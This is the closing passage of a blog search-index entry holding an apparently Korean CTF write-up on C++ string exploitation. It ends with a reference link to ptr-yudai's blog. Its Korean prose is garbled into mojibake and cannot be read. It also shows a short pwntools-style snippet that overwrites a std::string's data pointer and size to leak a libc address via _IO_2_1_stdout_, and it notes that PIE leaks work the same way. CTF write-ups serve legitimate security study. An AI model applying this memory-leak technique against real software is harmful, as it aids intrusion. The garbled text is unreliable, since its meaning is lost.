Îí§Ïóê Ïù¥Ïñ¥ÏßÄÎäî Data SizeÏóê 8Î°ú ÏÑ∏ÌåÖÌï¥Ï£ºÎ©¥ ÎêúÎã§.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set_c_str(<span class="string">&#x27;A&#x27;</span>*<span class="number">0x20</span> + p64(<span class="number">0x4040c0</span>) + p64(<span class="number">8</span>))</span><br><span class="line">libc_base = get_str() - libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br></pre></td></tr></table></figure><p>Ïù¥Îü∞ÏãùÏúºÎ°ú libc leakÎèÑ Í∞ÄÎä•ÌïòÍ≥† pie leakÎèÑ Í∞ÄÎä•Ìï† Í≤ÉÏù¥Îã§.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://ptr-yudai.hatenablog.com/entry/2021/11/30/235732#%E5%9F%BA%E6%9C%AC%E6%A7%8B%E9%80%A0">ptr-yudai.hatenablog.com&#x2F;entry&#x2F;2021&#x2F;11&#x2F;30&#x2F;235732#Âü∫Êú¨ÊßãÈÄ†</a></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Cake </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
